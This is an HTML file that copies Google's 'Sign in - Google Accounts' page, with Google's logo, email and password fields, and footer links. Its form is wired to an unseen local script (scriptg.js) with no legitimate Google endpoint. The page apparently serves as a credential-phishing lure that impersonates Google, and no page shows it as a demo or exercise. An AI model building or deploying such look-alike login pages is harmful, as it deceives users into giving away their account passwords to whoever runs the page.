<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="styleg.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="page">
        <div class="header">
            <a href="#" class="logo">
                <svg viewBox="0 0 24 24" width="72" height="24">
                    <path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.26H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                    <path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                    <path fill="#fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                    <path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
            </a>
        </div>

        <div class="login-container">
            <div class="login-card">
                <h1 class="title">Sign in</h1>
                <p class="subtitle">Use your Google Account</p>

                <form id="loginForm">
                    <div class="input-group email">
                        <input type="email" id="email" name="email" required placeholder="Email or phone">
                        <label>Email or phone</label>
                    </div>

                    <div class="input-group password">
                        <input type="password" id="password" name="password" required placeholder="Password">
                        <label>Password</label>
                        <span class="toggle-password">Show password</span>
                    </div>

                    <div class="form-options">
                        <label class="checkbox">
                            <input type="checkbox" id="remember">
                            <span class="checkmark"></span>
                            Stay signed in
                        </label>
                        <a href="#" class="forgot">Forgot email?</a>
                    </div>

                    <button type="submit" class="submit-btn" id="submitBtn">
                        <span class="btn-text">Next</span>
                        <div class="loader" style="display: none;"></div>
                    </button>
                </form>

                <div class="divider">
                    <span>Not your computer? Use Guest mode to sign in privately.</span>
                    <a href="#" class="learn-more">Learn more</a>
                </div>

                <div class="create-account">
                    <a href="#" class="create-link">Create account</a>
                </div>
            </div>

            <div class="language">
                <select>
                    <option>English</option>
                </select>
                <a href="#">Help</a>
            </div>
        </div>

        <div class="footer">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">About Google</a>
        </div>
    </div>

    <script src="scriptg.js"></script>
</body>
</html>
